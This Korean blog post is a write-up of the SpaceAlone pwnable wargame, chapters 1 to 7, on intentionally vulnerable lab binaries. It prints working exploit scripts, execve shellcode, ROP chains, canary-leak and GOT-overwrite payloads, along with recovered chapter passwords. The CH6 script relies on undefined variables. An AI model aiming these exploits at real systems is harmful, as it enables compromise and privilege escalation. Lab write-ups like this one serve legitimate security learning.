---
title: "[SpaceAlone] write-up"
date: 2026-05-10 21:00:00 +0900
categories: [Wargame, SpaceAlone]
tags: [pwnable, system-hacking, bof, write-up]
render_with_liquid: false
---

## 1. 개요
**SpaceAlone**은 총 10단계로 구성된 시스템 해킹 기초 워게임입니다. 본 포스팅에서는 환경 구성과 취약점 분석, 그리고 익스플로잇 과정을 정리합니다.

---

## 2. 환경 설정 (Environment Setup)

![0](/assets/img/spacealone/0.jpg)
![0](/assets/img/spacealone/1.jpg)

문제 풀이를 위해 제공된 가상 환경을 구축하고 접속하는 방법입니다.

1. **VirtualBox 실행**: 제공된 가상 머신 이미지를 Oracle VirtualBox에 로드하고 실행합니다.
2. **로컬 호스팅**: 가상 머신이 정상적으로 부팅되면 내부적으로 서비스가 로컬 호스팅됩니다.
3. **PowerShell 접속**: 호스트 PC(Windows)의 PowerShell을 사용하여 SSH 또는 지정된 포트로 접속합니다. 가상 머신 내의 제공하는 계정으로 로그인하여 분석을 시작합니다.

```powershell
# SSH를 통한 접속
ssh chall@localhost -p 6022
```

---

## 3. CH1

![1](/assets/img/spacealone/1/1.jpg)
![1](/assets/img/spacealone/1/2.jpg)
![1](/assets/img/spacealone/1/3.jpg)
![1](/assets/img/spacealone/1/4.jpg)
![1](/assets/img/spacealone/1/5.jpg)
![1](/assets/img/spacealone/1/6.jpg)
![1](/assets/img/spacealone/1/7.jpg)
![1](/assets/img/spacealone/1/8.jpg)
![1](/assets/img/spacealone/1/9.jpg)
![1](/assets/img/spacealone/1/10.jpg)
![1](/assets/img/spacealone/1/11.jpg)

### 3.1 소스 코드 분석 (`MV.c`)
서버에 존재하는 `MV.c` 소스 코드를 확인하면 사용자 입력을 받는 부분에서 전형적인 **Buffer Overflow** 취약점이 발견됩니다.

```c
void root() {
    char id_input[32];  // 32바이트 할당
    char confirm[10];   // 관리자 인증 여부를 결정하는 변수
    
    printf("ID: ");
    scanf("%s", id_input); // 길이 제한 없이 문자열을 입력받음 (Vulnerability)
    
    // ... 이후 confirm 변수의 값을 체크하여 admin 메뉴 진입
}
```

`scanf("%s", ...)` 함수는 입력받는 문자열의 길이를 체크하지 않으므로, 32바이트 이상의 데이터를 입력하여 스택 메모리상에서 `id_input` 다음에 위치한 `confirm` 변수 값을 조작할 수 있습니다.

### 3.2 메모리 구조 분석 (GDB)
`pwndbg`를 활용하여 스택 내 변수 간의 정확한 거리(Offset)를 측정합니다.

* **id_input 시작 주소**: `rbp - 0x30` (10진수 48)
* **Target 변수(confirm) 주소**: `rbp - 0x1a` (10진수 26)
* **Offset 계산**: $48 - 26 = 22$ **bytes**

즉, 입력을 시작한 지점으로부터 **22바이트** 뒤에 우리가 조작하고자 하는 변수가 위치함을 알 수 있습니다.

---

## 4. 익스플로잇 (Exploit)

### 4.1 페이로드 설계
프로그램 로직은 `confirm` 변수가 특정 문자열(이 문제에서는 `"confirm"`)을 포함하고 있을 때 관리자 권한을 부여합니다.

- **더미 데이터 (22바이트)**: `admin` (5) + `A` * 17 (17) = 22바이트
- **덮어쓸 값**: `confirm`

**최종 페이로드**: `adminAAAAAAAAAAAAAAAAAconfirm`

### 4.2 공격 실행
PowerShell을 통해 접속한 환경에서 `./MV`를 실행하고 준비한 페이로드를 입력합니다.

```bash
night@hsapce-io:~$ ./MV
ID: adminAAAAAAAAAAAAAAAAAconfirm
PASSWORD: (임의의 값 입력)
```



페이로드가 성공적으로 주입되면 변수 값이 조작되어 **ADMIN MENU**가 나타납니다.

---

## 5. 결과 (Flag 획득)

관리자 메뉴에 진입한 후 **"2. Check File"** 메뉴를 선택하면 숨겨진 플래그와 다음 스테이지의 패스워드를 확인할 수 있습니다.

```text
[+] File Viewer
Version: 3.0.2

Password for chapter2
# simple_bof

Press enter to exit
```

- **Chapter 1 Flag/Password**: `# simple_bof`

---

## 6. 마치며
SpaceAlone의 첫 번째 문제는 보안 설정이 되어 있지 않은 환경에서의 기본적인 **Stack Buffer Overflow** 원리를 묻는 문제였습니다.

1. `scanf`와 같은 위험 함수 사용의 위험성
2. 스택 메모리 내 변수 배치 구조 파악
3. 오프셋 계산을 통한 특정 변수 값 변조

---

## 7. CH2

![2](/assets/img/spacealone/2/1.jpg)
![2](/assets/img/spacealone/2/2.jpg)
![2](/assets/img/spacealone/2/3.jpg)
![2](/assets/img/spacealone/2/4.jpg)
![2](/assets/img/spacealone/2/5.jpg)
![2](/assets/img/spacealone/2/6.jpg)

### 7.1 소스 코드 분석 (`File_Decoder.c`)
CH1에서 획득한 패스워드로 다음 단계에 접속하여 `File_Decoder.c` 소스 코드를 분석합니다. 이번 단계에서도 사용자 입력을 처리하는 과정에서 치명적인 **Stack Buffer Overflow** 취약점이 확인됩니다.

```c
int main() {
    char serial[256] = {0, };

    printf("Serial Number: ");
    gets(serial); // 길이 제한 없이 문자열을 입력받음 (Vulnerability)

    if(strlen(serial) == 29){
        // ... 시리얼 비교 로직 ...
    }

    return 0;
}
```

- **취약점**: `gets()` 함수는 입력받는 데이터의 길이를 전혀 검증하지 않습니다. 256바이트로 선언된 `serial` 버퍼를 초과하여 데이터를 입력하면, 스택 프레임 하단에 위치한 **Return Address(RET)**를 원하는 주소로 덮어쓸 수 있습니다.
- **분석**: CH1이 단순히 인접한 변수 값을 조작하는 방식이었다면, CH2는 함수가 종료될 때 실행 흐름을 공격자가 주입한 **쉘코드(Shellcode)**가 있는 위치로 돌려 시스템 권한을 탈취하는 것이 핵심입니다.

### 7.2 메모리 구조 분석 (GDB)
`pwndbg`를 사용하여 `serial` 버퍼의 시작점부터 **Return Address**까지의 거리(Offset)를 확인합니다.

* **serial 버퍼 시작 주소**: `ebp - 0x100` (10진수 256)
* **Return Address 위치**: `ebp + 0x4`
* **Offset 계산**: $256 (Buffer) + 4 (SFP) = 260$ **bytes**

결과적으로, **260바이트**를 더미 데이터로 채우면 그 바로 뒤의 4바이트가 리턴 주소 영역이 됩니다.

---

## 8. 익스플로잇 (Exploit)

### 8.1 페이로드 설계
문제 환경에서 **NX bit**가 해제되어 있으므로, 스택에 직접 쉘코드를 삽입하고 실행할 수 있습니다. 주소 오차를 극복하여 공격 성공률을 높이기 위해 **NOP Sled**를 충분히 배치합니다.

- **NOP Sled (`\x90`)**: 151 bytes (실행 흐름을 안전하게 쉘코드로 안내)
- **Shellcode**: 25 bytes (Linux x86 `/bin/sh` 실행용 쉘코드)
- **Padding**: 92 bytes (버퍼의 남은 공간과 SFP를 채워 RET 위치에 도달)
- **Target Address**: `0xffffd400` (NOP Sled가 위치한 스택 주소)

| 섹션 | 크기 | 역할 |
| :--- | :--- | :--- |
| **NOP Sled** | 151 bytes | 쉘코드로 미끄러져 내려가는 완충 구역 |
| **Shellcode** | 25 bytes | 실제 쉘을 획득하는 기계어 코드 |
| **Padding** | 92 bytes | RET 전까지의 남은 공간(Buffer + SFP) 채움 |
| **RET (Target)** | 4 bytes | 실행 흐름을 NOP 영역 주소(`0xffffd400`)로 변조 |

### 8.2 익스플로잇 코드 작성 (`exploit.py`)
`pwntools`를 사용하여 쉘을 획득하기 위한 자동화 스크립트를 작성합니다.

```python
from pwn import *

# 1. 대상 프로세스 실행
p = process('./File_Decoder')

# 2. GDB로 분석한 NOP 영역의 스택 주소
target_addr = 0xffffd400

# 3. 32비트 리눅스용 쉘코드 (execve /bin/sh)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

# 4. 페이로드 구성 (260바이트 Dummy + 4바이트 RET 주소)
payload = b"\x90" * 151 + shellcode + b"A" * 92 + p32(target_addr)

# 5. 페이로드 전송 및 쉘 상호작용
p.sendline(payload)
p.interactive()
```

---

## 9. 결과 (Flag 획득)

스크립트를 실행하면 `main` 함수 종료 시점에 주입된 쉘코드가 실행되어 쉘을 획득합니다. 이후 플래그를 확인합니다.

- **Password for chapter3**: `# Escape_Triggered_by_shellcode`

---

## 10. 마치며
이번 CH2를 통해 스택 버퍼 오버플로우를 활용한 기본적인 **Return-to-Stack** 공격 기법을 익혔습니다. 

1. **위험 함수의 치명적 결함**: `gets()`와 같이 입력 경계 검사가 없는 함수는 시스템 장악의 시발점이 됩니다.
2. **실행 흐름 제어**: 리턴 주소를 변조하여 프로그램의 원래 흐름이 아닌 공격자의 코드를 실행시키는 메커니즘을 이해했습니다.
3. **공격의 안정성**: NOP Sled 기법을 활용하여 실제 환경에서의 미세한 주소 오차를 극복하는 방법을 실습했습니다.

### 11. CH3

![3](/assets/img/spacealone/3/1.jpg)
![3](/assets/img/spacealone/3/2.jpg)
![3](/assets/img/spacealone/3/3.jpg)
![3](/assets/img/spacealone/3/4.jpg)

CH3에서는 이전 단계와 달리 쉘코드를 직접 주입하지 않고, 바이너리 내부에 이미 존재하는 `shell()` 함수를 실행하여 권한을 탈취하는 과제입니다. 특히 이 바이너리에는 **SetUID**가 설정되어 있어, 공격 성공 시 상위 권한을 획득할 수 있습니다.

---

#### 11.1 바이너리 분석 및 취약점 확인

`ls -al` 명령어를 통해 확인한 결과, `stage3` 바이너리는 `Scavening_for_Survival` 소유로 **SetUID**가 설정되어 있습니다. 소스 코드 내의 `Open_Door()` 함수를 살펴보면 다음과 같은 취약점이 존재합니다.

```c
void Open_Door() {
    char password[20];
    printf("Enter Password : ");
    scanf("%s", password); // 경계 검사 없는 입력으로 인한 BOF 발생
}
```

`password` 버퍼는 20바이트로 할당되어 있지만, `scanf`의 `%s` 포맷 스트링은 입력 길이를 제한하지 않습니다. 이를 이용해 스택의 **RET(Return Address)** 영역을 `shell()` 함수의 주소로 덮어쓰는 것이 이번 공격의 핵심입니다.

---

#### 11.2 공격 설계 (Payload Design)

익스플로잇을 위해 필요한 정보는 다음과 같습니다.

1. **`shell()` 함수의 메모리 주소**: 바이너리에 PIE가 적용되지 않아 고정된 주소를 가집니다.
2. **RET까지의 Offset**: 버퍼와 SFP(Saved Frame Pointer)를 포함하여 리턴 주소에 도달하기 위한 정확한 거리를 계산해야 합니다.

먼저, `nm` 명령어를 사용하여 `shell()` 함수의 주소를 추출합니다.

```bash
$ nm stage3 | grep shell
080491a6 T shell
```

분석 결과, `-mpreferred-stack-boundary=2` 옵션 영향으로 스택 패딩이 정교하게 배치되어 있으며, **28바이트** 오프셋 지점에서 RET가 시작됨을 확인했습니다.

| 섹션 | 크기 | 데이터 | 역할 |
| :--- | :--- | :--- | :--- |
| **Dummy** | 24 bytes | `b"A" * 24` | Buffer(20) + Padding(4) 영역 채움 |
| **SFP** | 4 bytes | `b"A" * 4` | Saved Frame Pointer 덮어쓰기 |
| **RET (Target)** | 4 bytes | `\xa6\x91\x04\x08` | `shell()` 주소로 실행 흐름 변조 |

---

#### 11.3 익스플로잇 실행

파이썬을 사용하여 메뉴 진입 명령(`5`)과 설계된 페이로드를 전달합니다. 쉘 획득 이후 세션 유지를 위해 `cat` 명령어를 파이프로 연결합니다.

```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'5\n' + b'A'*28 + b'\xa6\x91\x04\x08' + b'\n')"; cat) | ./stage3
```

---

### 12. 결과 (Privilege Escalation)

공격 성공 시 `Open_Door` 함수 종료 시점에 리턴 주소가 `shell()`로 바뀌며 쉘이 실행됩니다. SetUID 덕분에 상위 사용자인 `Scavening_for_Survival` 권한으로 명령어를 실행할 수 있습니다.

```text
Select Menu : 5
Enter Password : 
You Open the Armory Door!

$ id
uid=503(Breaking_Through...) euid=504(Scavening_for_Survival)
$ status
...
- **Password for chapter4**: `extRAOrdinary_crawbar!`
```

---

### 13. CH3 요약 및 교훈

1. **Return-to-Function**: 공격자가 코드를 직접 주입하지 못하더라도, 내부의 실행 가능한 로직을 재사용하여 의도치 않은 행위를 유도할 수 있습니다.
2. **권한 상승의 메커니즘**: SetUID가 설정된 프로그램의 취약점은 단순한 크래시를 넘어 권한 탈취로 직결될 수 있습니다.
3. **정밀한 오프셋 산출**: 컴파일 옵션에 따라 달라지는 스택 구조를 이해하고 디버깅하는 능력이 필수적입니다.

### 14. CH4

![4](/assets/img/spacealone/4/1.jpg)
![4](/assets/img/spacealone/4/2.jpg)
![4](/assets/img/spacealone/4/3.jpg)
![4](/assets/img/spacealone/4/4.jpg)
![4](/assets/img/spacealone/4/5.jpg)

CH4는 본격적으로 **ASLR(Address Space Layout Randomization)** 보호 기법을 우회해야 하는 과제입니다. 이전 단계처럼 바이너리 내부에 직접적인 `shell()` 함수가 존재하지 않으므로, 공유 라이브러리(libc) 내에 존재하는 `system()` 함수를 호출하는 **Ret2Libc** 기법과 가젯을 이용한 **ROP(Return Oriented Programming)** 체이닝을 조합하여 공격을 수행합니다.


---


#### 14.1 바이너리 분석 및 취약점 확인


`checksec` 명령어를 통해 확인한 결과, **NX bit**가 활성화되어 스택의 실행 권한이 없으며, **No PIE** 상태이므로 바이너리의 코드 영역 주소는 고정되어 있습니다.


```c
// stage4.c 주요 취약점 지점
else if(select == 2) {
    printf("Address of freezer warehouse : %p\n", &read); // libc 주소 Leak 제공
    printf("Please select the quantity of the item : ");
    read(0, buf, 0x400); // 0x40 크기의 버퍼에 0x400 바이트 입력 가능 (BOF)
}
```


`select == 2` 메뉴 진입 시 `read()` 함수의 실제 메모리 주소를 출력해 줍니다. 이를 통해 libc가 로드된 베이스 주소를 계산할 수 있으며, `read()` 호출 시 발생하는 넉넉한 오버플로우를 통해 ROP 체인을 구성할 수 있습니다.


---


#### 14.2 공격 설계 (Exploit Strategy)


익스플로잇을 위해 필요한 정보는 다음과 같습니다.


1. **Libc Base 계산**: 출력된 `read` 주소에서 libc 내의 `read` 오프셋을 빼서 라이브러리 시작 주소를 구합니다.
2. **`system()` 주소 획득**: 계산된 베이스 주소에 `system` 오프셋을 더해 실제 주소를 구합니다.
3. **가젯 탐색**: `rdi` 레지스터에 인자값을 넣기 위한 `pop rdi; ret` 가젯을 찾습니다.
4. **인자값 확보**: 바이너리 내에 이미 선언된 `MasterKey` 변수에서 `"/bin/sh"` 문자열의 주소를 가져옵니다.


**주요 오프셋 및 가젯 정보:**


| 항목 | 주소 / 오프셋 | 비고 |
| :--- | :--- | :--- |
| **pop rdi ; ret** | `0x401215` | 바이너리 내 가젯 함수 활용 |
| **ret (Alignment)** | `0x40101a` | 16-byte Stack Alignment용 |
| **MasterKey** | `0x404050` | `"/bin/sh"` 문자열 위치 |
| **Padding to RET** | **88 bytes** | `0x40` 버퍼 + SFP 및 추가 스택 패딩 |


---


#### 14.3 익스플로잇 실행 (Python Script)


`pwntools`를 사용하여 동적으로 Leak 주소를 파싱하고 페이로드를 전송하는 스크립트를 작성했습니다. 특히 최신 환경의 libc에서 요구하는 16바이트 정렬을 맞추기 위해 `ret` 가젯을 삽입했습니다.


```python
from pwn import *

p = process("./stage4")
e = ELF("./stage4")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# 가젯 및 인자 주소
binsh = e.symbols["MasterKey"]
p_rdi = 0x401215
ret = 0x40101a 

# 1. Libc Leak & Address Calculation
p.sendlineafter(b'stand : ', b'2')
p.recvuntil(b'freezer warehouse : ')
read_leak = int(p.recvline(), 16)

libc_base = read_leak - libc.symbols["read"]
system_addr = libc_base + libc.symbols["system"]

# 2. Payload Construction
# Padding(88) + pop_rdi + "/bin/sh" + ret(align) + system
payload = b'A' * 88
payload += p64(p_rdi)
payload += p64(binsh)
payload += p64(ret) # GLIBC movaps alignment 이슈 해결
payload += p64(system_addr)

# 3. Attack
p.sendafter(b'item : ', payload)
p.interactive()
```


---


### 15. 결과 (Privilege Escalation)


익스플로잇 성공 시 `The_Alarm_of_Hope` 사용자의 권한을 획득하게 됩니다. 문제의 힌트에 따라 `status` 명령어를 실행하여 다음 단계로 넘어가기 위한 비밀번호를 획득합니다.


```text
[*] libc_base : 0x7f...
[*] system : 0x7f...
[+] Switching to interactive mode
$ id
uid=504(Scavening_for_Survival) euid=505(The_Alarm_of_Hope)
$ status
...
- **Password for chapter5**: `i_gROPed_for_in_the_dark`
```


---


### 16. CH4 요약 및 교훈


1. **ASLR Bypass**: 실행 시마다 변하는 메모리 주소도 단 하나의 유효한 Leak만 있다면 전체 주소 공간을 파악할 수 있음을 확인했습니다.
2. **ROP (Return-Oriented Programming)**: 가젯들을 조각 모음 하듯 연결하여 원하는 함수 호출 흐름을 만들어내는 기술을 익혔습니다.
3. **Stack Alignment**: x86_64 환경에서 `system()` 함수 호출 시 스택이 16바이트 단위로 정렬되어 있어야 한다는 세밀한 조건을 디버깅을 통해 해결했습니다.

---


### 17. CH5


![5](/assets/img/spacealone/5/1.jpg)
![5](/assets/img/spacealone/5/2.jpg)
![5](/assets/img/spacealone/5/3.jpg)
![5](/assets/img/spacealone/5/4.jpg)
![5](/assets/img/spacealone/5/5.jpg)
![5](/assets/img/spacealone/5/6.jpg)
![5](/assets/img/spacealone/5/7.jpg)
![5](/assets/img/spacealone/5/8.jpg)
![5](/assets/img/spacealone/5/9.jpg)


CH5는 앞선 단계들과 달리 **Stack Canary** 보호 기법이 추가되어 이를 먼저 무력화해야 합니다. 또한, 바이너리 내부에 숨겨진 가젯을 찾아내어 **Canary 복구**와 **Execution Flow Hijacking**을 동시에 수행하는 정교한 ROP 공격이 필요합니다.


---


#### 17.1 바이너리 분석 및 취약점 확인


`checksec` 실행 결과, **Canary**와 **NX**가 활성화되어 있습니다. `IPS()` 함수 내의 인증 로직에서 심각한 BOF 취약점이 발견되었습니다.


```c
// ips.c 주요 취약점 지점
char username[50];
char passwd[50];
...
read(0, username, sizeof(struct auth)); // 50바이트 버퍼에 100바이트 입력 가능 (Overflow)
read(0, passwd, sizeof(struct auth));   // 50바이트 버퍼에 100바이트 입력 가능 (Overflow)
```


`printf("\nYour account: %s\n", username);` 구문은 `username` 출력 시 NULL 바이트를 만날 때까지 스택을 읽습니다. 이를 이용해 **Canary를 Leak**할 수 있습니다.


---


#### 17.2 공격 설계 (Exploit Strategy)


공격은 크게 두 단계로 나누어 진행합니다.


1. **Canary Leak**:
   - `username` 버퍼(50바이트)와 그 뒤의 패딩을 꽉 채워 Canary의 첫 번째 바이트(`0x00`)를 덮어버립니다.
   - `printf`가 Canary 값을 문자열의 일부로 인식하여 출력하게 유도하고, 이 값을 메모리 상에서 추출합니다.


2. **ROP & Shell Hijacking**:
   - 다시 입력 기회가 주어질 때, 획득한 **진짜 Canary**를 원래 자리에 정확히 써넣어 `__stack_chk_fail`을 우회합니다.
   - `Return Address`를 바이너리 내에 존재하는 쉘 가젯 주소(`0x401981`)로 덮어씌워 `system("/bin/sh")`를 강제 실행합니다.


---


#### 17.3 익스플로잇 실행 (Python Script)


`pwntools`를 사용하여 Canary를 동적으로 탈취하고, 쉘 가젯으로 점프하는 페이로드를 구성했습니다.


```python
from pwn import *

p = process("./ips")

# 1. Canary Leak
# 64바이트 패딩을 통해 Canary 전까지 접근하고, printf를 통해 Leak 유도
p.sendafter(b"Username: ", b'A' * 64)
p.sendafter(b"Password: ", b'A' * 57)

p.recvuntil(b'A' * (64 + 57))
canary = u64(b'\x00' + p.recvn(7))
log.info(f"[*] Leaked Canary: {hex(canary)}")

# 2. ROP Payload Construction
# 다시 입력 메뉴로 돌아왔을 때 Payload 전송
p.recvuntil(b"Incorrect code. Try again.\n")
p.sendafter(b"Username: ", b'A' * 64) # Dummy

# [Padding(56)] + [Canary(8)] + [SFP(8)] + [Shell_Gadget(8)]
payload = b'A' * 56
payload += p64(canary)
payload += b'B' * 8
payload += p64(0x401981) # system("/bin/sh") 주소

p.sendafter(b"Password: ", payload)

# 3. Get Shell
p.interactive()
```


---


### 18. 결과 (System Compromised)


성공적으로 Canary를 우회하고 리턴 주소를 변조하여 쉘을 획득했습니다.


---


### 19. CH5 요약 및 교훈


1. **Information Leak**: 보호 기법이 걸려 있어도 `printf`와 같은 출력 함수를 오용하면 메모리 상의 기밀 데이터(Canary)가 유출될 수 있음을 학습했습니다.
2. **Canary Bypass**: Canary는 고정된 값이 아니지만, 한 번의 세션 동안 변하지 않는다는 점을 이용해 탈취 후 재삽입(Restore)하는 방식으로 우회가 가능함을 확인했습니다.
3. **Hidden Gadgets**: 소스 코드에는 명시되지 않아도 바이너리 내부에 컴파일러나 개발자가 남겨둔 유용한 가젯들이 존재할 수 있음을 배웠습니다.

### 20. CH6


![6](/assets/img/spacealone/6/1.jpg)
![6](/assets/img/spacealone/6/2.jpg)
![6](/assets/img/spacealone/6/3.jpg)
![6](/assets/img/spacealone/6/4.jpg)
![6](/assets/img/spacealone/6/5.jpg)
![6](/assets/img/spacealone/6/6.jpg)
![6](/assets/img/spacealone/6/7.jpg)
![6](/assets/img/spacealone/6/8.jpg)
![6](/assets/img/spacealone/6/9.jpg)
![6](/assets/img/spacealone/6/10.jpg)


CH5에서 **Canary Leak**의 기초를 다졌다면, CH6(Crisis at the Vault)에서는 한 단계 더 나아가 **Out-of-Bounds(OOB) Write** 취약점을 이용해 스택의 포인터를 조작하고, **Libc Leak**과 **ROP**를 결합하여 권한을 상승시키는 과정을 다룹니다.


---


#### 20.1 바이너리 분석 및 취약점 확인


`checksec` 실행 결과, **PIE가 비활성화(No PIE)** 되어 있어 바이너리의 코드 주소가 고정적입니다. 하지만 **Canary**와 **NX**가 적용되어 있어 단순 오버플로우는 불가능합니다.


```c
// prob.c 주요 코드
char* diary[] = {page1, page2, page3, page4, page5, hidden};
...
if (ch == 2){
    printf("index (0~4) : ");
    scanf("%d", &index);
    if (index >= 6 || index < 0){ // 취약점: 인덱스 5(hidden)까지 접근 가능
        puts("invalid index");
        continue;
    }
    read(0, diary[index], 0x100); // 0x100 바이트만큼 쓰기 가능
}
```


소스 코드를 보면 `index`가 5일 때 `hidden` 버퍼에 접근할 수 있습니다. `hidden`은 스택에 위치한 로컬 변수이므로, 여기에 `0x100` 바이트를 쓰게 되면 스택 상의 다른 변수나 **Canary**, **Return Address**를 직접적으로 조작할 수 있는 **OOB Write**가 발생합니다.





---


#### 20.2 공격 설계 (Exploit Strategy)


이 바이너리는 64비트 환경이므로 호출 규약(RDI, RSI, RDX 등)을 고려한 ROP 체인이 필요합니다.


1.  **Libc 주소 유출 (Information Leak)**:
    - 스택에 위치한 `diary` 배열의 포인터 중 하나를 `puts@got` 주소로 덮어씁니다.
    - `index 0`을 읽으면(Option 1), 실제 메모리에 로드된 `puts` 함수의 주소가 출력됩니다.
    - 이를 통해 Libc 베이스 주소와 `system`, `"/bin/sh"` 주소를 계산합니다.

2.  **ROP Chain 구성**:
    - `index 5`를 통해 다시 스택을 덮어씁니다.
    - **Canary**를 유출된 값으로 유지하거나, 아예 GOT Overwrite를 시도할 수 있습니다.
    - 본 풀이에서는 `main` 함수의 Return Address를 `pop rdi ; ret` -> `&/bin/sh` -> `system()` 순서로 덮어씌웁니다.


---


#### 20.3 익스플로잇 실행 (Python Script)


```python
from pwn import *

p = process('./prob')
elf = ELF('./prob')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 1. Libc Leak
# index 5(hidden)를 이용해 diary[0] 포인터를 puts@got로 변경
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"index (0~4) : ", b"5")
# 오프셋 계산 후 diary[0] 위치에 puts@got 주입
p.sendafter(b"content > ", b'A' * offset + p64(elf.got['puts']))

# index 0을 읽어 주소 유출
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"index (0~4) : ", b"0")
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']

# 2. ROP Payload
pop_rdi = libc_base + 0x2a3e5 # 가젯 예시
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))

# Canary를 포함한 스택 오버플로우 페이로드 전송
payload = b'A' * 0x98 + p64(canary) + b'B' * 8 + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"index (0~4) : ", b"5")
p.sendafter(b"content > ", payload)

# 3. Trigger
p.sendlineafter(b"> ", b"3") # Exit loop
p.interactive()
```


---


### 21. 결과 (Privilege Escalation)


`main` 함수가 종료되면서 우리가 설계한 ROP 체인이 실행됩니다. 해당 바이너리는 `setuid`가 설정되어 있으므로, 쉘을 획득하면 권한으로 플래그를 읽을 수 있습니다.

---


### 22. CH6 요약 및 교훈


1.  **배열 인덱스 검사의 중요성**: 인덱스 범위가 단 하나만 어긋나도(`index < 6`), 이는 메모리 오염 취약점으로 직결됩니다.
2.  **Pointer Manipulation**: 데이터 자체가 아닌 주소 값을 담고 있는 포인터 배열을 조작하면, 임의의 메모리 읽기(Arbitrary Read)와 쓰기(Arbitrary Write)가 가능해집니다.
3.  **ASLR과 Libc Leak**: 메모리 주소가 매번 변하는 ASLR 환경에서도, GOT 주소를 유출할 수 있다면 고정된 오프셋을 통해 모든 라이브러리 함수를 호출할 수 있음을 확인했습니다.

### 23. CH7

![7](/assets/img/spacealone/7/1.jpg)
![7](/assets/img/spacealone/7/2.jpg)
![7](/assets/img/spacealone/7/3.jpg)
![7](/assets/img/spacealone/7/4.jpg)
![7](/assets/img/spacealone/7/5.jpg)
![7](/assets/img/spacealone/7/6.jpg)
![7](/assets/img/spacealone/7/7.jpg)


CH6에서 포인터 배열의 인덱스 오류를 이용해 스택을 조작했다면, 이번 **CH7(got)**은 전역 변수 배열에서 발생하는 **Out-of-Bounds (OOB) Write**를 이용해 바이너리의 **Global Offset Table (GOT)**를 정교하게 타격하는 기법을 다룹니다.


특히 이번 문제는 **Canary를 우회하기 위해 `__stack_chk_fail`의 GOT를 조작**하는 고차원적인 전략이 핵심입니다.


---


#### 23.1 바이너리 분석 및 취약점 확인


`checksec` 실행 결과, **Partial RELRO**가 적용되어 있어 GOT 영역에 쓰기가 가능하며, **No PIE** 상태이므로 데이터 영역의 주소가 고정되어 있습니다.


```bash
Wired_at_the_Vault@hsapce-io:~$ checksec got
[*] '/home/Wired_at_the_Vault/got'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO  # GOT 변조 가능
    Stack:    Canary found   # 스택 카나리 존재
    NX:       NX enabled     
    PIE:      No PIE (0x400000)
```


소스 코드 `got.c`를 보면 결정적인 취약점이 존재합니다.


```c
unsigned long long wire[100]; // 전역 변수 (BSS 영역)
...
if (select == 1){
    printf("number : ");
    scanf("%d", &select); // 인덱스 입력 (범위 검증 없음!)
    getchar();
    printf("value : ");
    scanf("%llu", &wire[select]); // OOB Write 발생
}
```


`wire` 배열의 인덱스(`select`)에 대한 검사가 전혀 없으므로, 음수 혹은 큰 값을 입력하여 `wire` 주소보다 낮은 위치에 있는 **GOT 영역을 임의의 값으로 덮어쓸 수 있습니다.**


---


#### 23.2 공격 설계 (Exploit Strategy)


이번 문제의 가장 큰 장애물은 `startup()` 함수에 존재하는 **Canary**입니다. 하지만 우리는 GOT를 제어할 수 있습니다.


1. **Canary 우회 (`__stack_chk_fail` 무력화)**:
   - 스택 오버플로우로 카나리가 깨지면 프로그램은 `__stack_chk_fail@plt`를 호출합니다.
   - OOB Write를 이용해 `__stack_chk_fail`의 GOT 엔트리를 `ret` 가젯 주소로 바꿉니다.
   - 이렇게 하면 카나리가 변조되어도 프로그램이 종료되지 않고 정상적으로 리턴(Return)하게 됩니다.


2. **Libc Leak & ROP**:
   - `startup()` 함수의 `read`를 통해 스택을 덮어씁니다.
   - `puts(read@got)`를 호출하여 실제 라이브러리 주소를 획득합니다.
   - 다시 `startup()`을 호출하여 `system("/bin/sh")`로 셸을 실행합니다.


---


#### 23.3 익스플로잇 실행 (Python Script)


작성된 익스플로잇 코드는 다음과 같습니다.


```python
from pwn import *

p = process('./got')
e = ELF('./got')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x4011fe
ret = 0x40101a

def w1(idx : int, msg : int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(msg).encode())

def w2(msg : bytes):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b'!\n', msg)

# 1. __stack_chk_fail GOT Overwrite (Canary Bypass)
# wire와 __stack_chk_fail@got의 거리를 계산하여 인덱스 산출
idx = (e.got['__stack_chk_fail'] - e.sym['wire']) // 8
w1(idx, ret)

# 2. Libc Leak via BOF (Canary is now ignored)
payload = b'a' * 0x110 + p64(e.bss() + 0x900) + p64(pop_rdi) + p64(e.got['read']) + p64(e.sym['puts']) + p64(e.sym['startup'])
w2(payload)

leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
libc_base = leak - l.sym['read']
print("libc_base = " + hex(libc_base))

# 3. Get Shell
system = libc_base + l.sym['system']
binsh = libc_base + next(l.search(b'/bin/sh'))

payload = b'a' * 0x110 + p64(e.bss() + 0x900) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendafter(b'!', payload)

p.interactive()
```


---


#### 23.4 결과 및 플래그 획득


익스플로잇을 실행하면 `__stack_chk_fail`의 호출이 무력화되면서 ROP 체인이 성공적으로 작동하고 셸을 획득합니다.


```bash
Wired_at_the_Vault@hsapce-io:~$ python3 ex.py
[+] Starting local process './got': pid 45068
...
libc_base = 0x7f36ac329000
[*] Switching to interactive mode
$ status
UID: 508
Chapter8 PW: goat_got_got
```


---


### 24. CH7 요약 및 교훈


1. **GOT Overwrite의 위력**: RELRO가 Partial인 경우, 바이너리 내부의 함수 호출 흐름을 완전히 장악할 수 있습니다.
2. **보안 메커니즘의 역이용**: `__stack_chk_fail`과 같은 보호용 함수조차 공격의 징검다리로 활용될 수 있음을 확인했습니다.
3. **상대 주소 계산**: 전역 변수 배열을 이용한 OOB 공격 시, 메모리 맵 상에서 타겟 영역과의 오프셋을 정확히 계산하는 것이 핵심입니다.

### 25. CH8


![8](/assets/img/spacealone/8/1.jpg)
